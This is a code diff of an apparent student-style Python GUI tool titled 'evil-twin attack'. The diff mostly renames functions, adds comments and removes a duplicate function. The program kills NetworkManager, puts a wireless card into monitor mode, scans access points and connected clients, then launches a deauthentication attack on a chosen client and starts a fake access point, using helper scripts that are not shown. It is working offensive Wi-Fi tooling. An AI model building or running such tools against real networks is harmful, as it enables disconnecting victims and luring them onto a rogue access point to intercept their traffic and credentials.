@@ -34,9 +34,9 @@ def change_channel():
     global search_timeout
     ch = 1
     now = datetime.now()
-    while (now - start_scan).seconds < search_timeout+2:
+    while (now - start_scan).seconds < search_timeout + 2:
         now = datetime.now()
-        outlinepritner(f"iwconfig {monitor_interface} channel {ch}")
+        gui_line_printer(f"iwconfig {monitor_interface} channel {ch}")
         ch = ch % 14 + 1
         time.sleep(0.3)
 
@@ -58,11 +58,9 @@ def scan_networks(pkt):
 
             ap_list.append([network_name, mac, channel])
 
-            # Print in the Gui all Connect AP
 
-
-
-# todo gal need to add comments to the function
+# The function check tha packets if there are a packet with the same mac as source MAC or Access Point
+# Mac and then check if the device Mac is connect to the Access Point
 def only_clients(pkt):
     if (pkt.addr2 == target_mac or pkt.addr3 == target_mac) and \
             pkt.addr1 != "ff:ff:ff:ff:ff:ff":
@@ -84,7 +82,7 @@ def scan_clients():
     target_mac = mac_addr  # ap_mac
     search_timeout = search_timeout * 2
     start_scan = datetime.now()
-    outlinepritner(f"iwconfig {monitor_interface} channel {channel}")
+    gui_line_printer(f"iwconfig {monitor_interface} channel {channel}")
 
     channel_changer = Thread(target=change_channel)
     channel_changer.daemon = True
@@ -113,22 +111,14 @@ def APs_scanner():
     channel_changer.join()
 
 
-# todo gal we have the function twice, here and as a layout check if we need to delete one of them
-def death_attack(client_mac: str):
-    print(monitor_interface, target_mac, client_mac)
-    line = f"python3 death_attack.py {monitor_interface} {target_mac} {client_mac}"
-    gnome = f'gnome-terminal -- sh -c "{line}"'
-    outlinepritner(gnome)
-
-
 # set one interface(Wlan) to be Monitor Mode
 def device_choose_step1():
     global monitor_interface
-    outlinepritner('service NetworkManager stop')
-    outlinepritner('airmon-ng check kill')
-    outlinepritner('ifconfig ' + monitor_interface + ' down')
-    outlinepritner('iwconfig ' + monitor_interface + ' mode monitor')
-    outlinepritner('ifconfig ' + monitor_interface + ' up')
+    gui_line_printer('service NetworkManager stop')
+    gui_line_printer('airmon-ng check kill')
+    gui_line_printer('ifconfig ' + monitor_interface + ' down')
+    gui_line_printer('iwconfig ' + monitor_interface + ' mode monitor')
+    gui_line_printer('ifconfig ' + monitor_interface + ' up')
 
 
 interfaces = ['wlan0', 'wlan1']
@@ -171,7 +161,7 @@ def layout_choose_from_ap_list():
                [sg.Listbox(ap_list, size=(40, 10), enable_events=True, key='_ap_')]]
 
         col2 = [
-            [sg.ProgressBar((search_timeout*10), orientation='v', size=(20, 20), key='progressbar')],
+            [sg.ProgressBar((search_timeout * 10), orientation='v', size=(20, 20), key='progressbar')],
             [sg.Text(size=(10, 2), font=('Helvetica', 20), justification='center', key='text')]]
         layout = [[sg.Column(col), sg.Column(col2)],
                   [sg.Text('command run')],
@@ -206,23 +196,27 @@ def layout_choose_from_client_list():
     return layout
 
 
-def outlinepritner(str):
+# The Function will print the commend on the gui line
+def gui_line_printer(str):
     global window
     global command
 
     os.system(str)
-    command=str
+    command = str
     if mode_layout == "start":
         time.sleep(0.2)
         window['_printer_'].update(str)
         window.refresh()
 
+
+# The function create a thread that run the gui and the attack
 def thread_side(fun):
-    ap_thread = Thread(target=fun)  # run a script to find all connected adapters
+    ap_thread = Thread(target=fun)
     ap_thread.daemon = True
     ap_thread.start()
 
 
+# The function create the fake Access Point
 def fake_ap():
     global ap_interface
     global ap
@@ -230,6 +224,7 @@ def fake_ap():
     os.system("python3 Create_fake_AP.py " + ap_interface + " " + network_name)
 
 
+# The function attack the device
 def attack():
     global monitor_interface
     global target_mac
@@ -246,14 +241,15 @@ def main():
     global window
     global search_timeout
     global mode_layout
-    mode_layout="start"
+
+    mode_layout = "start"
     # Interface Welcome - Welcome Gui
     layout_Start = [[sg.Text('Welcome to evil-twin attack')],
-                   [sg.Image('Evil-Twin-Attack.png')],
+                    [sg.Image('Evil-Twin-Attack.png')],
                     [sg.Button('start Evil-Twin'), sg.Button('Cancel')]]
     window = sg.Window('Evil-Twin', layout_Start, size=(550, 610), element_justification='c')
 
-    timerisrunnig=False
+    timer_is_running = False
 
     while True:
         event, values = window.read(timeout=10)
@@ -273,8 +269,8 @@ def main():
                     time.sleep(1)
                     window.close()
                     window = sg.Window('evil-twin attack', layout_choose_from_ap_list(), finalize=True)
-                    thread_side(APs_scanner)
-                    timerisrunnig=True
+                    thread_side(APs_scanner)  # A thread to run a AP scanner along with the gui
+                    timer_is_running = True
 
                 else:
                     sg.popup_error('please choose different interface ')
@@ -285,27 +281,24 @@ def main():
             global ap
             ap = values['_ap_']
             window.close()
-            timerisrunnig = True
+            timer_is_running = True
 
-            thread_side(scan_clients) # find all connected devices to the selected AP
+            thread_side(scan_clients)  # find all connected devices to the selected AP
             window = sg.Window('evil-twin attack', layout_choose_from_client_list(), finalize=True)
 
         if event == 'rescan':
             if mode_layout == "AP":
-                timerisrunnig =True
+                timer_is_running = True
                 thread_side(APs_scanner)
             if mode_layout == "client":
-                timerisrunnig =True
+                timer_is_running = True
                 thread_side(scan_clients)
 
-
-
-
-        if timerisrunnig:
+        if timer_is_running:
             time.sleep(0.2)
             progress_bar = window['progressbar']
             # loop that would normally do something useful
-            for i in range(search_timeout*10):
+            for i in range(search_timeout * 10):
                 event, values = window.read(timeout=10)
                 time.sleep(0.1)
                 if mode_layout == "AP":
@@ -313,22 +306,20 @@ def main():
                 else:
                     window['cl'].update(client_list)
                 window['_printer_'].update(command)
-                # update bar with loop value +1 so that bar eventually reaches the maximum
+                # update bar with loop value + 1 so that bar eventually reaches the maximum
                 progress_bar.UpdateBar(i + 1)
                 window.refresh()
 
-            timerisrunnig=False
-
+            timer_is_running = False
 
         if event == 'select client' and values['cl']:
             global client
             client = values['cl']
-
             window.close()
-            attack()
-            fake_ap()
 
+            attack()  # A DDOs attack on the device
 
+            fake_ap()  # Create the fake Access point
         if event == sg.WIN_CLOSED or event == 'Cancel':  # if user closes window or clicks cancel
             break
 
